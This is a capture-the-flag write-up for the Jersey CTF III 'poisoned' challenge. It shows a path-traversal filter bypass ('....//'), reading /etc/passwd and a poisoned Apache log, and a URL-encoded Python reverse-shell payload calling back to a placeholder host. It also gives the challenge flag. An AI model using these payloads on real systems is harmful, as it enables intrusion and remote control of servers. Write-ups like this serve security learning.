---
title: Jersey CTF III - poisoned
date: 2023-04-16 23:19:54
tags: writeups
---

```
Seems these pesky AI hackers are up to no good again! 
You must find out how where they POISONED this site and 
use that to find the file they placed on our web server!
```

Right away you can tell that this challenge wants you to manipulate the php parameter page based on the URL

```
https://jerseyctf-poisoned-v2.chals.io/?page=welcome
```

If you throw an arbitrary string there, you can see that based on the error it's likely possible to inject something there to read off the server. 

```
https://jerseyctf-poisoned-v2.chals.io/?page=../../../etc/passwd
```

The above LFI doesn't work because the server is attempting to sanitize our input but they dropped the ball and likely only had code to remove the "../", because the following LFI works:

```
https://jerseyctf-poisoned-v2.chals.io/?page=....//....//....//....//etc/passwd
```

Based on the challenge name and the description, we should look at either the apache or nginx logs to see if the other hackers poisoned the log files. I won't show the nginx file since it turned up empty but the apache2 logs seem like they've been poisoned.

```
https://jerseyctf-poisoned-v2.chals.io/?page=....//....//....//....//var/log/apache2/access.log
```

![](https://i.imgur.com/HEjwVQ7.png "poisoned")

The php script put at access.log is expecting a parameter `command` which will get run by `system()`. The rest of the challenge is trivial and we can either list around the server or get a reverse shell to explore on our own.

```
https://jerseyctf-poisoned-v2.chals.io/?page=....//....//....//....//var/log/apache2/access.log&poison=python3%20-c%20%27socket=__import__(%22socket%22);os=__import__(%22os%22);pty=__import__(%22pty%22);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22YOURIP%22,YOURPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27
```

Luckily for us the server had python3 installed and we are able to get a reverse shell call back to our handler. The flag was located at `/secret_fl4g.txt`.


```
jctf{4PachE_L0G_POiS0nInG}
```